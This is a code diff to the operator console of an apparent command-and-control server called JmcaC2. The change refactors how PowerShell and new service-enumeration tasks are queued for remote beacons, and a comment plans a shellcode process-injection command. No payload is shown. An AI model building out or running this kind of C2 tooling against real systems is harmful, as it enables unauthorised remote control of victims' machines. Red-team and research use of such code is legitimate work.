@@ -80,27 +80,21 @@ namespace JmcaC2
                         SetCurrentBeaconSession(CmdArgs);
                         break;
 
-                    case "tasks":
-                        PrintTasks();
-                        break;
                     //TODO: process injection command, with shellcode passed as DATA in BeaconTask
-
-                    case "powershell":
-                        if (CurrentBeacon == null)
-                        {
-                            Console.ForegroundColor = ConsoleColor.Red;
-                            Console.WriteLine(" No active beacon selected. Run: use BeaconName");
-                            Console.ForegroundColor = ConsoleColor.White;
-                            break;
-                        }
-                        BeaconTasks.Add(new BeaconTask(CurrentBeacon.Name, CmdPrefix, CmdArgs));
-                        Console.WriteLine($"Added task for {CurrentBeacon.Name}");
-                        break;
-                    //  Dictionary<string, string> command = new Dictionary<string, string> { { CmdPrefix, CmdArgs } };
                     case "stop":
                         serverRunning = false;
                         listener.Stop();
                         Console.WriteLine("Server stopped");
+                        break;
+                    //  << TASKS >>
+                    case "tasks":
+                        PrintTasks();
+                        break;
+                    case "powershell":
+                        CreateTask(CmdPrefix, CmdArgs);
+                        break;
+                    case "enumservices":
+                        CreateTask(CmdPrefix, CmdArgs);
                         break;
                     case "exit":
                         programRunning = false;
@@ -119,6 +113,20 @@ namespace JmcaC2
         // View currently active beacon connections
 
 
+
+        static private void CreateTask(string CmdPrefix, string CmdArgs)
+        {
+
+            if (CurrentBeacon == null)
+            {
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine(" No active beacon selected. Run: use BeaconName");
+                Console.ForegroundColor = ConsoleColor.White;
+                return;
+            }
+            BeaconTasks.Add(new BeaconTask(CurrentBeacon.Name, CmdPrefix, CmdArgs));
+            Console.WriteLine($"Added task for {CurrentBeacon.Name}");
+        }
 
         static private string GenerateClientName()
         {
